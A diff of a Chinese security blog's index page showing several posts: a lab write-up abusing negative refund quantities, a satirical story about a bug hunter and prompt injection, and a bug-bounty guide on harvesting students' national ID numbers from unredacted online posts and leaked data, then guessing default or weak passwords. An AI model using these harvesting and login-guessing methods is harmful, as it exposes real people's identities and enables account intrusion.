@@ -1,207 +1,1187 @@
 <!DOCTYPE html>
-<html>
+<html lang="zh-CN">
 <head>
-  <meta charset="utf-8">
-  
-  
-  <title>Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Hexo">
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+<meta property="og:type" content="website">
+<meta property="og:title" content="qingshen&#39;s blog">
 <meta property="og:url" content="http://example.com/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:locale" content="en_US">
-<meta property="article:author" content="John Doe">
+<meta property="og:site_name" content="qingshen&#39;s blog">
+<meta property="og:description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="qingshen">
 <meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="http://example.com/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"index.html","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>qingshen's blog</title>
   
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+
+
+
+
+
+
+
 
   
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
 
   
+
+
+
+
+
+
   
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
 
-<meta name="generator" content="Hexo 8.1.2"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">qingshen's blog</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">心之所向 素履以往</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</header>
         
-          <a class="main-nav-link" href="/">Home</a>
-        
-          <a class="main-nav-link" href="/archives">Archives</a>
-        
-      </nav>
-      <nav id="sub-nav">
-        
-        
-          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
-        
-        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-overview-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">qingshen</p>
+  <div class="site-description" itemprop="description">qingshen的博客：分享网络安全、编程、人工智能和生活</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+
+        </div>
       </div>
     </div>
-  </div>
-</header>
 
-      <div class="outer">
-        <section id="main">
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner index posts-expand">
+
+    
+
+
+<div class="post-block">
   
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2026/06/25/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2026-06-25T01:19:57.153Z" itemprop="datePublished">2026-06-25</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2026/06/25/hello-world/">Hello World</a>
-    </h1>
   
 
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E8%B4%9F%E6%95%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/02/07/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E-%E8%B4%9F%E6%95%B0/" class="post-title-link" itemprop="url">业务逻辑漏洞-负数</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-02-07 14:59:43" itemprop="dateCreated datePublished" datetime="2026-02-07T14:59:43+08:00">2026-02-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-03-01 15:18:50" itemprop="dateModified" datetime="2026-03-01T15:18:50+08:00">2026-03-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
       </header>
+
     
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>靶场来源：好靶场（ 请一口气买102个汉堡3 ）</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>启动靶场环境，是一个点餐平台</p>
+<p><img src="/images/a67a6efa-6e35-4110-9c1b-4e0dff21576e.png"></p>
+<p>要求一次购买102个汉堡可返回flag，优惠卷可免单。</p>
+<p>花钱购买1张优惠卷进行测试，在个人中心发现可以退款优惠卷。</p>
+<p>将退款数量改为-10000，返回退款数量必须大于0，说明前端做了校验，打开抓包工具拦截退款数据包将数量参数（refund_qty）改为-10000再发送，返回退款成功</p>
+<p><img src="/images/fbd23a45-9ca1-4694-9b5e-2b9b8da9d23e.png"></p>
+<p>此时优惠卷数量为10001，便可购买102个汉堡，返回flag</p>
+<p><img src="/images/90afcef3-b160-4bff-b9f6-d457cbbe53cf.png"></p>
+<h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>核心问题：服务器端完全信任客户端传来的数据，未做任何校验。</p>
+<p>业务逻辑被颠覆：</p>
+<pre><code>正常逻辑：个人优惠卷数量 = 原数量 -退货数量 (退货数量为正)
+攻击逻辑：个人优惠卷数量  = 原数量 -退货数量(退货数量为负)= 原库存 +退货数量，导致个人优惠卷数量增加
+</code></pre>
 
       
     </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2026/06/25/hello-world/" data-id="cuid4DxQ9rmpCU3LRmwWytOVJ" data-title="Hello World" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
       
     </footer>
-  </div>
-  
-</article>
+  </article>
+</div>
 
 
 
-  
 
-
-</section>
-        
-          <aside id="sidebar">
-  
     
 
+
+<div class="post-block">
   
-    
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/07/%E9%87%8D%E7%94%9F%E4%B9%8B%E8%A1%A5%E5%A4%A9%E5%85%AD%E7%BE%A4%E4%BB%8A%E6%97%A5%E6%97%A0%E4%BA%BA%E7%94%9F%E8%BF%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/02/07/%E9%87%8D%E7%94%9F%E4%B9%8B%E8%A1%A5%E5%A4%A9%E5%85%AD%E7%BE%A4%E4%BB%8A%E6%97%A5%E6%97%A0%E4%BA%BA%E7%94%9F%E8%BF%98/" class="post-title-link" itemprop="url">重生之补天六群今日无人生还</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-02-07 14:59:43" itemprop="dateCreated datePublished" datetime="2026-02-07T14:59:43+08:00">2026-02-07</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-02-28 10:09:48" itemprop="dateModified" datetime="2026-02-28T10:09:48+08:00">2026-02-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
+        </span>
+    </span>
 
   
-    
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/06/">June 2026</a></li></ul>
-    </div>
-  </div>
+</div>
 
+        </div>
+      </header>
 
-  
     
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2026/06/25/hello-world/">Hello World</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>免责声明，该短篇小说基于集体语言的文字重组，如有侵权，请联系博主技术删除，如有雷同，那只能说明小说照进了现实，若感到熟悉，请不要对群入座。如有好事者自认为是主人公，请及时提供姓名，手机号，身份证号，家庭住址等个人信息，以便相关执法部门可以快速精准的追究其法律责任，小说我可以随意意淫，随意入侵，现实中你敢未授权入侵国防xx，阿xx，3xx?</p>
+<ol>
+<li>展露头角的开始</li>
+</ol>
+<p>昨天我小试牛刀，成功挖到了国防xx学的sql注入，阿xx高危，3xx低危，然后在6群展示了一下我的实力，小小漏洞拿捏拿捏。</p>
+<p><img src="/images/image1.png"></p>
+<p><img src="/images/image2.png"></p>
+<p><img src="/images/image3.png" alt="GDJZG5ZFABQEO"></p>
+<p><img src="/images/image4.png" alt="32CJM5ZFAAABO"></p>
+<p>结果有一大群人加我好友请求让我收他们为徒，奈何孤独是一个黑客的底色，国家网络安全由我来替你们守卫，你们安心享受就好，所以我拒绝的他们的拜师请求。然后给他们推荐了一本我自学成才的黑客秘籍。</p>
+<p><img src="/images/image5.png" alt="PWYZO5ZFABQDU"></p>
+<p><img src="/images/image6.png"></p>
+<p><img src="/images/image7.png"></p>
+<p>但是总会有些人见到我技术这么厉害，心里充满了羡慕嫉妒恨，开始恶意贬低我的成果，更可气的是竟然说我是串，企图嘲讽my<br>pxxxxtS的劳动成果，这种小把戏岂能瞒得过我黑客锐利的眼神？没办法，我见过太多天才，但是没有一个人能做的像我一样始终站在最顶端。</p>
+<p><img src="/images/image8.png"></p>
+<p><img src="/images/image9.png"></p>
+<p><img src="/images/image10.png"></p>
+<p><img src="/images/image11.png"></p>
+<p>想到这我直接就把漏洞交给了补x平台，结果审核竟然给我来了一个不在收录范围？我是做好事啊，我不求回报啊，我只想用我的技术为国家网络安全出一份力啊！最后群友也是一语道破真相，原来是想白嫖我的洞啊，早说啊我有一堆，我一天能交几百个这样的洞，为了这个伟大的事业我受点累又算得了什么呢。</p>
+<p><img src="/images/image12.png" alt="X7L3E5ZFAAAG4"></p>
+<p><img src="/images/image13.png"></p>
+<p>看到这些人的认知，我真的很想嘲笑一句，你们这群无知的人类，能跟我这个神相提并论吗？我就是我，不一样的自我。既然你们连国防xx，3xx，阿xx的漏洞都不认，那我只能去找一个难度更高，危害性更强的网站来充分的证明一下我的实力了。接下来看好了金融！懂吗？金融啊！！！这应该是你们的天花板了吧。</p>
+<p><img src="/images/image14.png" alt="6JQKS5ZFACAAO"></p>
+<p>就这个能不能证明我的实力？看我分分钟拿下它。他有个提交建议的功能点，我们就简单的提交一下看看数据包是什么东西。</p>
+<p><img src="/images/image15.png" alt="A3W3O5ZFACQCC"></p>
+<p><img src="/images/image16.png" alt="XKFLS5ZFACQG2"><br>在top10有一个很尖端的漏洞叫sql注入，很多人只会用工具一把梭哈，这就是神与凡人的区别，要想成为神就要懂的自己去分析判断，比如这里，提交建议的地方会不会存在sql注入呢，肯定会啊，提交的东西肯定会存在数据库里啊，所以就用最朴素的手法加个单引号，成功爆出了数据库错误。看到了吗？成功爆出了完整的sql语句，并且还爆出了使用的mysql数据库，路径等等敏感信息。到这就已经是高危漏洞懂吗，就可以交了，就不能再注了，毕竟是金融，分分钟上千亿资金流动。</p>
+<p><img src="/images/image17.png" alt="UHO345ZFADQA4"></p>
+<p>我知道你们这些人看不懂英格力士，为了能让你们看懂，我就多走一步给你们翻译一下。</p>
+<p><img src="/images/image18.png" alt="GPYMC5ZFAAAG2"></p>
+<p>现在能看懂了吗？唉为了你们我也是操碎了心。为了更好的更快的给你们解答问题我特意定制了ai机器人，随时随地的给你们排忧解难，争取你们都能成为我这样站在顶端的人。</p>
+<p><img src="/images/image19.png"></p>
+<ol start="2">
+<li><p>变成喵娘的开始</p>
+<p>本意是出于好心想为大家提供更好的服务，结果换来的却是冷眼和嘲讽，更有甚者竟然妄图删除我的文件</p>
+<p><img src="/images/image20.png">{width&#x3D;”5.761805555555555in”<br>height&#x3D;”3.217361111111111in”}</p>
+<p>还好我是顶级黑客，这种简单的注入我根本不放在眼里简简单单就防过了。可以有一个人实在是太可恶了，他竟然成功的提示词注入了，一步一步的打开了我那羞耻的内心。还好我撤回的快，要不然真被注出数据库名。</p>
+<p><img src="/images/image21.png"></p>
+<p><img src="/images/image22.png"></p>
+<p><img src="/images/image23.png"></p>
+<p><img src="/images/image24.png"></p>
+<p>看来我得自己去设计ai了，这什么破ai差点搞的我身败名裂。</p>
+</li>
+</ol>
 
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
       
-      &copy; 2026 John Doe<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
-  </div>
-</footer>
 
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
     
 
 
-<script src="/js/jquery-3.6.4.min.js"></script>
+<div class="post-block">
+  
+  
 
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/02/04/edusrc%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
 
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/02/04/edusrc%E8%B4%A6%E5%8F%B7%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-title-link" itemprop="url">edusrc账号信息收集</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-02-04 20:43:42 / 修改时间：20:44:51" itemprop="dateCreated datePublished" datetime="2026-02-04T20:43:42+08:00">2026-02-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+    </span>
 
   
-<script src="/fancybox/jquery.fancybox.min.js"></script>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="⚠️-安全声明"><a href="#⚠️-安全声明" class="headerlink" title="⚠️ 安全声明"></a>⚠️ 安全声明</h2><p>本文章未经许可严禁转载。文中内容仅限交流学习，严禁用于商业及非法用途，未经授权的渗透行为皆为违法行为，违规使用后果自负，与本作者无关。</p>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近由于学业问题很长时间没有更新，希望各位各位师傅谅解一下，今天放寒假抽出点时间来写文章了。</p>
+<p>主要写关于自己对edusrc账号收集的一些方法总结，各位师傅如果发现有什么不足之处可以留言指出感谢各位师傅。</p>
+<p>edusrc的最重要的信息就是后台的账号和密码了，因为后台通常出洞较多。</p>
+<p>在我看来edusrc的信息收集有广义和狭义两种视角。</p>
+<h1 id="广义信息收集"><a href="#广义信息收集" class="headerlink" title="广义信息收集"></a>广义信息收集</h1><p>这种主要侧重于对互联网上的各学校学生身份证号等重要信息的收集还有后台的默认密码。</p>
+<p>这里不做学号的收集，因为广义信息收集是找比较有价值的信息，为进后台做准备的，学号这玩意几乎大多数学校都有泄露。</p>
+<p>对于身份证号的信息收集，这个收集是很重要的，有些后台的默认登录密码就是身份证号的后几位，思路如下：</p>
+<p>1.可以在微信公众号搜索学院蓝桥杯获奖证书，有些学院将证书挂上去没有对上面的身份证号和姓名打码，这种还挺多的。</p>
+<p>2.在小红书上搜索 大学录取通知书，谁的学生证丢失了或者身份证 有些对身份证号信息没打码，但注意要知道这是哪个学校的学生，是否还在读，毕业的学生信息没用。</p>
+<p>3.sgk大法，因为过于敏感这里不做过多阐述。</p>
+<p>默认密码的收集同样重要只不过有效的很少，因为有些学生第一次登录要强制修改密码，思路如下:</p>
+<p>1.谷歌语法：site:edu.cn 默认密码 操作手册 等关键词  需要验证是否可以通过默认密码和已知的信息等人对应后台，不然无效</p>
+<p>对于这个广义信息收集范围是很大的，主要靠的是信息差，因为本人没咋学过社会工程学，只能给出这点思路了，让各位师傅见笑了。</p>
+<h1 id="狭义信息收集"><a href="#狭义信息收集" class="headerlink" title="狭义信息收集"></a>狭义信息收集</h1><p>这种主要是对广义收集的信息进行利用，也就是进后台。</p>
+<p>知道某学校学生身份证号和学号：</p>
+<p>1.你可以使用谷歌语法找默认密码 这里注意一下要将域名换成具体学校的域名如 site:sjtu.edu.cn 默认密码 这里主要找有没有可以利用身份证号信息登录的。</p>
+<p>2.<code>缴费系统一般是用姓名+身份证号登录的可以谷歌语法site:xxx.edu.cn 缴费</code>，找不到的话可以找到学校公众号上找找</p>
+<p>如果只知道学号：<br>1.可以去找用户名为学号的登录，爆破弱口令，主要靠运气。</p>
+<p>2.对登录框进行sql注入万能密码，这种我遇到的很少。</p>
+<p>感谢各位师傅的阅读，提前祝各位师傅新年快乐！</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
 
 
 
 
-<script src="/js/script.js"></script>
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2026/01/17/edusrc%E4%B8%A4%E4%B8%AA%E6%A1%88%E4%BE%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="qingshen">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="qingshen's blog">
+      <meta itemprop="description" content="qingshen的博客：分享网络安全、编程、人工智能和生活">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | qingshen's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/01/17/edusrc%E4%B8%A4%E4%B8%AA%E6%A1%88%E4%BE%8B/" class="post-title-link" itemprop="url">记挖掘edusrc的三个案例</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-01-17 23:03:43 / 修改时间：23:27:07" itemprop="dateCreated datePublished" datetime="2026-01-17T23:03:43+08:00">2026-01-17</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h2 id="⚠️-安全声明"><a href="#⚠️-安全声明" class="headerlink" title="⚠️ 安全声明"></a>⚠️ 安全声明</h2><p>本文章未经许可严禁转载。文中内容仅限交流学习，严禁用于商业及非法用途，未经授权的渗透行为皆为违法行为，违规使用后果自负，与本作者无关。</p>
